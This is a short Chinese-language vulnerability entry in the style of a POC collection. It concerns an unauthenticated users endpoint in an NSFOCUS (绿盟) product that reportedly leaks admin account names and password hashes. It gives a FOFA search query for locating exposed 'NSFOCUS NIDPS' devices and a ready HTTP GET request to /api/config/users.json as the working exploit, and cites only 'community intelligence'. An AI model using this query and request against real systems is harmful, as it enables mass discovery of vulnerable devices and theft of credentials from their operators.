## 绿盟 users 信息泄露漏洞

## 漏洞描述
绿盟某产品 `users` 接口未做访问控制即可返回用户列表，包含后台账号与密码哈希，导致敏感信息泄露。

## 网络空间测绘
```
fofa: title="NSFOCUS NIDPS"
```

## POC
```
GET /api/config/users.json HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
Connection: close
```

## 参考
- 社区情报

